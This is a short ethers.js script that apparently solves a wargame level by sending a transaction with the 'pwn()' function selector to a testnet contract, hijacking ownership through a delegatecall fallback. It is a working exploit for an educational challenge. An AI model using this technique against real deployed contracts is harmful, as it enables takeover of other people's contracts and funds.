const dotenv = require("dotenv");
const ethers = require("ethers");

dotenv.config({ path: "../../.env" });

const { RINKEBY_URL, MNEMONIC } = process.env;

const provider = new ethers.providers.JsonRpcProvider(RINKEBY_URL);
const wallet = ethers.Wallet.fromMnemonic(MNEMONIC);
const signer = wallet.connect(provider);

const instanceAddress = "0xfeC078A0E4158C48A821FB115aF97afBDe20256c";

const solve = async () => {
    try {
        const idelegation = new ethers.utils.Interface([])
        const delegationContract = new ethers.Contract(instanceAddress, idelegation, signer);
        const gasPrice = await provider.getGasPrice();
        const data = {
            to: delegationContract.address,
            from: signer.address,
            gasPrice,
            gasLimit: 50000, 
            data: ethers.utils.keccak256(ethers.utils.toUtf8Bytes("pwn()")).substring(0, 10)
        }
        let tx = await signer.sendTransaction(data);
        const receipt = await tx.wait();
        console.log(receipt);
    } catch (e) {
        console.error(e);
    }
}

solve();